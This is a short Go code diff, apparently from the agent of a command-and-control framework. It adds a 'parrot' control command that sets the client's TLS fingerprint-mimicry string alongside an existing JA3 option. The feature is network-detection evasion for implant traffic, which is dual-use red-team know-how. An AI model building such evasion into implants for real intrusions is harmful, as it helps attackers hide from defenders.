@@ -99,6 +99,11 @@ func (a *Agent) control(job jobs.Job) {
 		if err != nil {
 			results.Stderr = fmt.Sprintf("there was an error setting the client's JA3 string:\r\n%s", err.Error())
 		}
+	case "parrot":
+		err := a.Client.Set("parrot", cmd.Args[0])
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error setting the client's parrot string:\r\n%s", err.Error())
+		}
 	default:
 		results.Stderr = fmt.Sprintf("%s is not a valid AgentControl message type.", cmd.Command)
 	}
